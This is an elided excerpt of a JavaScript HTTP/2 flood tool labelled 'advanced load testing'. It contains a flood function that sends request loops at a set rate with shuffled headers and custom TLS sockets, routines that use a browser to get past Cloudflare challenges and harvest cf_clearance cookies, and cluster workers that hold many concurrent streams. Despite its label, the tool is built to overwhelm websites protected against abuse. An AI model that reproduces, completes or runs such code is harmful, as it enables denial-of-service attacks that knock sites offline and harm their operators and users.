...
const MAX_CONCURRENT_STREAMS_PER_WORKER = 20; // Connections per thread
...
function flood(userAgent, cookie) {
    try {
        ...
        let intervalTime = randomDelay(500, 1000); // Slightly increased for stability
        ...
        // Simplified header shuffling for better H2 compliance
        let headers = { ...fixed };
        ...
        function createCustomTLSSocket(parsed) {
            ...
            tlsSocket.on('error', () => { /* Silence TLS errors */ });
            return tlsSocket;
        }
        ...
        client.on("connect", () => {
            const requestLoop = setInterval(() => {
                ...
                for (let i = 0; i < args.Rate; i++) {
                    // Spread requests slightly to avoid instant congestion
...
async function bypassCloudflareOnce(attemptNum = 1) {
    ...
    try {
        ...
        while (!challengeCompleted && checkCount < 60) { // 30 seconds max
        ...
        if (cfClearance) {
             console.log(`\x1b[32mSuccess! cf_clearance obtained.\x1b[0m`);
        ...
        console.log(`\x1b[31mBypass failed: ${error.message}\x1b[0m`);
        if (browser) await browser.close();
...
async function bypassCloudflareParallel(totalCount) {
    ...
    // Attempt to get cookies one by one to avoid CPU spikes during browser launch
...
function displayStats() {
    ...
    console.log(`\x1b[36mReq/s:\x1b[0m ${elapsed > 0 ? Math.floor((global.totalRequests || 0)/elapsed) : 0}`);
...
if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35mADVANCED LOAD TESTING (FIXED)\x1b[0m");
    ...
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            ...
            // Start fixed pool of connections per worker
            // We DO NOT put this in a setInterval. We start them once, and they recurse/loop internally.
